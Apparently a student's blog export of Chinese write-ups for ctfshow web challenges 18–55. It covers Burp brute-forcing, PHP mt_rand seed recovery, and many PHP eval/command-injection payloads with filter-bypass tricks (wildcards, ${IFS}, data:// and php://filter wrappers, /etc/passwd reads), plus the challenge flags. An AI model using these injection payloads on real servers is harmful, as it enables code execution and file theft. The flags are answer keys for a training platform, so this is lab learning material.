<p>ctfshow{dfca4269-062e-4c5f-9140-3de1758c32a5}</p>
<h1>Web18</h1>
<p>游戏题，太好了，我是傻逼，就喜欢这种题</p>
<p>查看js文件，找目标</p>
<p>if(score&gt;100)</p>
<p>{</p>
<p>var result=window.confirm(“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”);</p>
<p>}</p>
<p>复制里边的东西，然后运行</p>
<p><img src="wps10.jpg" alt="img"></p>
<p>去看看url/110.php</p>
<p>ctfshow{0869ea96-75f4-4b14-87cd-48e8f6d4cce1}</p>
<h1>Web19</h1>
<p>提示：密钥什么的，就不要放在前端了</p>
<p><img src="wps11.jpg" alt="img"></p>
<p>用hackebar</p>
<p>方法一：Username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
<p>在原来的登录界面不行，因为没有解密啥的（后来知道他是在登录界面又加密了一下，所以要解密一下源码里面的），但是为啥在hackbar的post就可以</p>
<p>方法二：</p>
<p>解码然后在登录界面提交</p>
<p>这是什么解码？复制给ai问ai</p>
<p>解出来是</p>
<p>i_want_a_36d_girl</p>
<p>出题人脑子也纯有冰</p>
<p>ctfshow{c155ec3f-a3e9-44dc-84d6-03cd726e5751}</p>
<h1>Web20</h1>
<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
<p>url/db/db.mdb下载文件</p>
<p>flag{ctfshow_old_database}</p>
<h1>12-20总结</h1>
<p>1.后台登录界面url/robots.txt</p>
<p>2.尾页documen里面会有账号密码之类的<br>
3.网页图片editor浏览所有文件<br>
4.Php探针，url/tz.php然后就是进去phpinfo<br>
5.sql文件泄露url/backup.sql<br>
6.游戏找js文件<br>
7.密钥类的用hackbar或者自行ai解码</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web21-30</title>
    <url>/2025/01/19/web21-30/</url>
    <content><![CDATA[<h1><strong>Web21</strong></h1>
<p>有一点真麻烦</p>
<img src="image-20250119202523975.png" alt="image-20250119202523975" style="zoom:25%;">
<p>Bp抓包</p>
<p>发送给intruder</p>
<p>添加账号密码哪里</p>
<p><img src="wps12.jpg" alt="img"></p>
<p>用自定义迭代器(Custom Iterator)</p>
<p>payload配置当中</p>
<p>位置1添加admin</p>
<p><img src="wps13.jpg" alt="img"></p>
<p>位置2添加英文冒号</p>
<p><img src="wps14.jpg" alt="img"></p>
<p>位置3添加下载的附件</p>
<p><img src="wps15.jpg" alt="img"></p>
<p>Payload处理当中选择</p>
<p><img src="wps16.jpg" alt="img"></p>
<p>对我们添加的东西进行base64加密</p>
<p>关闭对勾</p>
<p><img src="wps17.jpg" alt="img"></p>
<p>开始破解</p>
<p>点击状态码</p>
<p><img src="wps18.jpg" alt="img"></p>
<p>第一个就是账号和密码</p>
<p>解码出来是</p>
<p><img src="wps19.jpg" alt="img"></p>
<p>admin:shark63</p>
<p>ctfshow{fb4fe60a-bc16-4982-92df-439262c04233}</p>
<h1><strong>Web22</strong></h1>
<p>没有靶机，自行wp</p>
<h1><strong>Web23</strong></h1>
<p><img src="wps20.jpg" alt="img"></p>
<p>根据源码可知，需要token为特定的值才可以得到flag</p>
<p>Token里面应该是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</p>
<p>当中任意的几个的结合体</p>
<p>Wp里面假设了三个，php脚本为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">print (strlen($string).&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for ($a = 0; $a &lt; 62; $a++) &#123;</span><br><span class="line"></span><br><span class="line">  for ($b = 0; $b &lt; 62; $b++) &#123;</span><br><span class="line"></span><br><span class="line">​    for ($c = 0; $c &lt; 62; $c++) &#123;</span><br><span class="line"></span><br><span class="line">​      $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line"></span><br><span class="line">​      $token = md5($flag);</span><br><span class="line"></span><br><span class="line">​      if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) &#123;</span><br><span class="line"></span><br><span class="line">​        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) &#123;</span><br><span class="line"></span><br><span class="line">​          echo $flag . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案有很多个a6e就是其中一个</p>
<p>但是也可以是2位的token</p>
<p>使用bp暴力破解出现3j</p>
<p><img src="wps21.jpg" alt="img"></p>
<p>这里要点击length</p>
<p><img src="wps22.jpg" alt="img"></p>
<p>同理用bp破解三位数也一样，但是四位数就比较耗费时间了，毕竟是暴力破解嘛</p>
<p><img src="wps23.jpg" alt="img"></p>
<p>ctfshow{83a47257-9025-4ea9-acb8-f7d5cbe4d541}</p>
<h1><strong>Web24</strong></h1>
<p>知识：伪随机数</p>
<p>我们先了解一下怎样生成随机数</p>
<?php

  echo intval(mt_rand());

?>
<p>Intval()函数，将浮点数、布尔值转化为整数或0、1</p>
<p>mt_rand()函数，会根据系统时间或者其他东西来产生随机数</p>
<p>在本题中出现了mt_srand()函数mt_srand(372619038);</p>
<p>其中的数字是seed种子，一旦使用了此函数，在之后的mt_rand()函数将基于该种子生成随机数，如果这里的种子不变，那么生成的随机数也会固定不变（因为生成随机数的算法不会变）</p>
<p>那么我们通过运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">  mt_srand(372619038);</span><br><span class="line"></span><br><span class="line">  echo intval(mt_rand());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到的数字1155388967就可以拿到flag</p>
<p>ctfshow{dddab7e5-2562-455d-9156-17542fe2507a}</p>
<h1><strong>Web25</strong></h1>
<p>$rand = intval($r)-intval(mt_rand());</p>
<p>当r=0时</p>
<p>Rand=-448251818</p>
<p>那么，mt_rand=448251818</p>
<p>这里需要反推出seed，下载php_mt_seed，拖进去ubuntu。对了，还需要php的版本，我们抓包看看响应头  PHP/7.3.11</p>
<p>在ubuntu运行脚本查看seed：928309670或者4126709391</p>
<p>在这里面运行（后一个seed正确）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
<p>得</p>
<p>448251818</p>
<p>614468087</p>
<p>Url/r=448251818  cookie=token=614468087</p>
<p>ctfshow{3944ae31-389f-4695-92fb-7791162db256}</p>
<h1><strong>Web26</strong></h1>
<p>进去之后是个下载的什么什么的东西</p>
<p>还有账号密码，应该是破解密码的</p>
<p>Bp抓包爆破7758521</p>
<p>ctfshow{9a82e93f-9eea-4340-8754-e2a1559f75cf</p>
<h1><strong>Web27</strong></h1>
<p>点击录取名单，有一个表格，那就从第一个人下手</p>
<p>高先伊621022********5237</p>
<p>很明显，这里需要bp暴力破解，注意抓post包</p>
<p>发送给intruder</p>
<p><img src="wps24.jpg" alt="img"></p>
<p><img src="wps25.jpg" alt="img"></p>
<p><img src="wps26.jpg" alt="img"></p>
<p>02015237</p>
<p>621022199002015237</p>
<p>ctfshow{45f62eec-3f98-4f37-a99e-2e564ac70f4f}</p>
<h1><strong>Web28</strong></h1>
<p>爆破目录</p>
<p><img src="wps27.jpg" alt="img"></p>
<p>换成集束炸弹模式，选中1 2，并把后面的2.txt删掉，右边1和2都从0到100，出来后点状态码，然后点响应就可以了</p>
<p><img src="wps28.jpg" alt="img"></p>
<p>ctfshow{d70041f1-624c-4a40-88ae-1a720cbb9e35}</p>
<h1>Web29</h1>
<p><img src="wps29.jpg" alt="img"></p>
<p>解释代码：</p>
<p>error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)，即不显示 PHP 运行过程中可能产生的错误信息。这样做可能是为了避免在某些情况下向用户暴露敏感信息，但在开发和调试阶段，通常不建议关闭错误报告，以便及时发现和解决问题。</p>
<p>if(isset($_GET[‘c’])){：isset()函数用于检查变量是否已设置且非null。这里是检查$_GET超全局数组中是否存在键为’c’的元素。如果存在，就执行下面的代码块。</p>
<p>$c = $_GET[‘c’];：将$_GET[‘c’]的值赋给变量$c，以便后续使用。</p>
<p>if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配。这里的正则表达式&quot;/flag/i&quot;表示不区分大小写地匹配字符串&quot;flag&quot;。!表示取反，即如果$c的值不包含（不区分大小写）“flag”，则执行下面的eval($c);语句。</p>
<p>eval($c);：eval()函数会将传入的字符串作为 PHP 代码执行。这是一个非常强大但也很危险的函数，因为如果传入的字符串来自不可信的来源（例如用户输入），可能会导致安全漏洞，如代码注入攻击。</p>
<p>总的来说：我们需要get一个命令，让它出现flag。然而，他又过滤了flag这四个字符，那怎么办？</p>
<p>\1. 使用Linux通配符，我们可以这样构造payload：?c=system(‘cat f*’);或者?c=system(‘cat [f]*’);然后查看源码得到flag，或者抓包看到flag</p>
<p>\2. ?c=system(“cat *.php&gt;&gt;1.txt”);把所有以php结尾的文件都写进一个txt</p>
<p>ctfshow{cd997bb9-1ab7-48a7-819a-c5e9856aedc3}</p>
<p>插入一点知识:</p>
<p>\1.  ?c=phpinfo();当中的disable_functions</p>
<p><img src="wps30.jpg" alt="img"></p>
<p>后面没有任何的值，也就是说，这里没有禁用任何的函数。那么我们就可以使用system函数来输出flag</p>
<p>\2.  ?c=system(‘ls’);看到有flag.php和index.php两个文件，那么我们想一想，能不能单独显示出来flag.php，然后前面加上一个cat？</p>
<p>scandir(“.”)扫描当前目录，但没有回显</p>
<p>套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那么，有了flag.php这个整体，那前面拼接一个cat是不是就可以了？</p>
<p>知识有限，止步于此</p>
<h1>Web30</h1>
<p>shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令</p>
<p>反引号和shell_exec()函数同理</p>
<p>?c=echo <code>cat f*</code>;看源码出flag</p>
<p>?c=passthru(‘cat f*’);</p>
<p>这里呢？哈哈哈哈，卢本伟：**</p>
<p>万能办法&gt;&gt;和cp(复制，和&gt;&gt;差不多)用法cp flag.php 1.txt</p>
<p>?c=echo <code>cat [f]*</code>;注意看源代码，你看你的软件，肯定没回显的</p>
<p>?c=echo <code>cat [f]* &gt;&gt; 1.txt</code>;</p>
<p>ctfshow{e6cce2cc-a5dc-4e88-ba65-3cc8d4620046}</p>
<h1>总结21-30</h1>
<p>1.bp当中的intruder为爆破部分</p>
<p>2.自定义迭代器(Custom Iterator):可以自动替换测试，而且可以添加前后缀，结果可以通过base64等加密一下</p>
<p>3.特定字符串内容一般abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789其中几个字符组成的，可以通过编写脚本得出需要的特定字符串</p>
<p>4.伪随机数mt_srand()和mt_srand(seed);产生的随机数是固定的。seed为数字串</p>
<p>5.intruder 当中有集束炸弹模式，可以选中多个部分进行爆破</p>
<p>6.if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配</p>
<p>7.isset()函数用于检查变量是否已设置且非null。if(isset($_GET[‘c’])){</p>
<p>8.eval()函数会将传入的字符串作为 PHP 代码执行</p>
<p>9.error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)</p>
<p>10.Linux通配符:  cat * [] {} ?</p>
<p>11.phpinfo();当中的disable_functions后面跟的值是禁用的函数</p>
<p>12.?c=system(“cat *.php&gt;&gt;1.txt”);把所有php的内容写到txt里面</p>
<p>13.scandir(“.”)表示扫描当前目录，一个点是当前目录，两个点是上级目录.套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那在前面拼接一个cat是不是可以拿到flag？</p>
<p>14.shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令.反引号和shell_exec()函数同理</p>
<ol start="15">
<li>?c=passthru(‘cat f*’);</li>
</ol>
<p>​		?c=echo cat [f]*;注意看源代码，你看你的软件，肯定没回显的</p>
<p>​		?c=echo cat [f]* &gt;&gt; 1.txt;</p>
<p>16.?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p>代码解释：从get当中获取了一个超全局变量a，并使用eval函数将其作为php代码执行</p>
<p>通过a来拿到flag，但这里似乎是在preg_match外运行的，不会受过滤的影响</p>
<p>$符号可以类比java当中的int</p>
<ol start="17">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line"></span><br><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<ol start="18">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat过滤</span><br><span class="line"></span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>19…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php无需括号的函数</span><br><span class="line"></span><br><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>20.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web31-命令执行结束</title>
    <url>/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/</url>
    <content><![CDATA[<h1>Web31</h1>
<p>?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p><img src="wps1.jpg" alt="img"></p>
<p>我们相当于在if这个条件里面添加了一个新的参数a，然后通过这个参数a进行操作</p>
<p>理解过程，我们先传进去了?c=eval($_GET[a]);，这串代码成功地执行了，并且跳出了if和else函数，然后在调用参数a，&amp;a=system(‘cat flag.php’);</p>
<p>各种payload：</p>
<p>?c=echo(<code>tac%09f*</code>);</p>
<p>?c=echo(<code>tail%09f*</code>);</p>
<p>需要查看源码：</p>
<p>?c=echo(<code>nl%09f*</code>);</p>
<p>?c=echo(<code>less%09f*</code>);</p>
<p>?c=echo(<code>more%09f*</code>);</p>
<p>…</p>
<p>见下绕过方法</p>
<p>ctfshow{15b00389-8276-40c6-a865-92ae407d30e4}</p>
<p>空格绕过</p>
<p>%09 符号需要php环境</p>
<p>{cat,flag.txt}</p>
<p>cat${IFS}flag.txt</p>
<p>cat$IFS$9flag.txt</p>
<p>cat&lt;flag.txt</p>
<p>cat&lt;&gt;flag.txt</p>
<p>kg=$‘\x20flag.txt’&amp;&amp;cat$kg</p>
<p>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
<p>cat过滤</p>
<p>more:一页一页的显示档案内容</p>
<p>less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</p>
<p>head:查看头几行</p>
<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
<p>tail:查看尾几行</p>
<p>nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</p>
<p>od:以二进制的方式读取档案内容</p>
<p>vi:一种编辑器，这个也可以查看</p>
<p>vim:一种编辑器，这个也可以查看</p>
<p>sort:可以查看</p>
<p>uniq:可以查看</p>
<p>file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</p>
<p>来源：<a href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p>
<p>Web32</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=system(‘cat flag.php’);</p>
<p>%0a是换行符url编码</p>
<p>include是 PHP 中的一个语句，用于将指定文件包含到当前 PHP 文件中</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=flag.php</p>
<p>这个由于前面没有分号，不能正常输出</p>
<p>最终正确payload：</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者：</p>
<p>?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>%0a和&quot;&quot;的区别还需考量</p>
<p>文件包含，可以直接用插件写，后面加上文件，最后解码</p>
<p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7NDg3MjQ5NmUtNDdkYy00M2E3LTkyYzItZDJmNjRhMzQxNjU3fSI7DQo</p>
<p>ctfshow{4872496e-47dc-43a7-92c2-d2f64a341657}</p>
<p>php无需括号的函数</p>
<p>echo 123;</p>
<p>print 123;</p>
<p>die;</p>
<p>include “/etc/passwd”;</p>
<p>require “/etc/passwd”;</p>
<p>include_once “/etc/passwd”;</p>
<p>require_once “etc/passwd”;</p>
<h1>Web33</h1>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{9e4bb5c3-42bd-4f47-be4b-eb8cd78f7319}</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>和</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>的区别是：有引号，优先执行</p>
<h1>Web34</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{e5e97ce9-f824-476c-bb46-97fd0fa94d55}</p>
<h1>Web35</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{c0c4ecbe-0caf-4c5a-969b-1db575e377d1}</p>
<p>Web36</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{5dc7f14c-82ab-419a-8a07-54f76fbcee7b}</p>
<p>Web37</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>他在里面又套了一个include，并且过滤了flag</p>
<p>那我们的</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>就失效了</p>
<p>新方法：</p>
<p>?c=data://text/plain,<?php system('cat fla*');?></p>
<p>ctfshow{0b8aa5cc-30a5-48bc-89e6-eca36f2c77bd}</p>
<p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
<p>伪协议的一种</p>
<h1>Web38</h1>
<p>题目里面过滤了php，所以?c=data://text/plain,<?php system('cat fla*');?>就不行了，因为里面有php，我们可以把php换成等号=，短标签</p>
<p>?c=data://text/plain,<?= system('cat fla*');?></p>
<p>另外一个办法</p>
<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==      //<?php system("nl flag.php ");?></p>
<p>Tac和ni都可以但是cat就不行，为啥，</p>
<p>ctfshow{76f2194a-afc2-40bd-b338-9010ea69bbe3}</p>
<h1>Web39</h1>
<p><img src="wps3.jpg" alt="img"></p>
<p>他在后面又加了一个.php没有用，因为我们已经用?&gt;合并了php代码</p>
<p>?c=data://text/plain,<?php system('cat fla?.php'); ?></p>
<p>他在后面加了.php那后面应该会报错，但是不影响我们拿flag</p>
<p>ctfshow{20616819-94c2-4f03-b3a8-d8bc1cb4042d}</p>
<h1>Web40</h1>
<p>函数 localeconv() 会返回一个包含本地环境信息的数组</p>
<p>pos()和 current()是等价的函数，它们会返回数组的当前元素</p>
<p>对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag</p>
<p>scandir()函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回 点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</p>
<p>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</p>
<p>array_reverse()函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</p>
<p>next()函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</p>
<p>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</p>
<p>show_source() 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</p>
<p>最终</p>
<p>payload?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
<p>ctfshow{231f7098-5080-450c-9cb1-454610f590e7}</p>
<p>另一种方法，但好像不可以拿到flag</p>
<p>c=session_start();system(session_id());</p>
<p>Cookie=PHPSESSID=ls</p>
<h1>web41</h1>
<p>这道题没得说</p>
<p><a href="https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></p>
<p>真服了，字母数字都禁了。还要脚本</p>
<h1>web42</h1>
<p><strong>&gt;/dev/null 2&gt;&amp;1</strong></p>
<p><strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong></p>
<p>2和1与错误输出和标准输入有关</p>
<p>总之就是不进行回显</p>
<p>那么题目里面又给了一个sys，并在里面把我们的回显给噶了</p>
<p>那么我们在一个sys里面能否执行多个指令？</p>
<p>这就需要命令分割了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>?c=cat flag.php ||</p>
<p>?c=cat flag.php ;</p>
<p>使用&amp;&amp;或者&amp;也可以，但是要对其进行url编码</p>
<p>?c=tac flag.php %26%26</p>
<p>ctfshow{631405df-72b0-4dab-aa64-f95c49f4924a}</p>
<h1>web43</h1>
<p>没有过滤||</p>
<p>?c=tac flag.php ||</p>
<p>ctfshow{d4f5849a-36c4-4026-a1b4-a2fed591d86a}</p>
<h1>web44</h1>
<p>cat绕过+通配符+命令分隔</p>
<p>?c=tac fl* ||</p>
<p>ctfshow{28d36c8d-f2cf-4c1d-bc7f-33d2270a8dd3}</p>
<h1>web45</h1>
<p>cat、空格绕过+通配符+命令分隔</p>
<p>这里tac也不行了</p>
<p>这里空格过滤指过滤了“ ”和“%20”</p>
<p>?c=nl%09fla*||</p>
<p>ctfshow{0d3c9cea-3c56-4439-b8cd-bf30b77b3b3f}</p>
<h1>web46</h1>
<p>过滤了数字，但是%09不属于数字</p>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{44400151-8bf6-4fe7-b2f1-647b96b0b8a8}</p>
<h1>web47</h1>
<p>/?c=nl%09fla?.php||</p>
<p>ctfshow{98523018-46d3-48c2-8baa-b4043f0ebf07}</p>
<h1>web48</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{d022aafe-76da-4be9-867e-88322ce50ef9}</p>
<h1>web49</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{89335b6d-8017-4792-a711-61a8b40d5ba9}</p>
<h1>web50</h1>
<p>&lt;&gt;与html编程有关，好像这里加一个这个可以弄出来一个空格</p>
<p>反斜杠\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code></p>
<p>''也没有什么含义，就是绕过了flag过滤</p>
<p>?c=tac&lt;&gt;fla\g.php||</p>
<p>?c=tac&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e6f38678-4786-4b07-8c0c-c0afeb267603}</p>
<h1>web51</h1>
<p>题目把tac噶了</p>
<p>?c=nl&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e43bd801-f9f9-4c0a-a0b8-235be559465b}</p>
<h1>web52</h1>
<p>?c=nl${IFS}fla’'g.php||</p>
<p>flag竟然是假的</p>
<p>看看根目录</p>
<p>?c=ls${IFS}/||</p>
<p>看到flag</p>
<p>?c=nl${IFS}/flag||</p>
<p>ctfshow{679e044a-5050-4f3b-847f-df73a21e1399}</p>
<h1>web53</h1>
<p>这里题目变了</p>
<p><img src="image-20250122001017484.png" alt="image-20250122001017484"></p>
<p>?c=nl${IFS}fla\g.php</p>
<p>ctfshow{321965b6-59b8-4416-93b4-2d92b628f457}</p>
<h1>web54</h1>
<p>grep test *file   在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<p>?c=grep${IFS}%27{ %27${IFS}fl???php</p>
<p>意思就是在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<p>?c=mv${IFS}fla?.php${IFS}b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>进入/b.txt</p>
<p>ctfshow{49f89c5e-7c29-4adf-9077-e1ad0993f5ad}</p>
<h1>web55</h1>
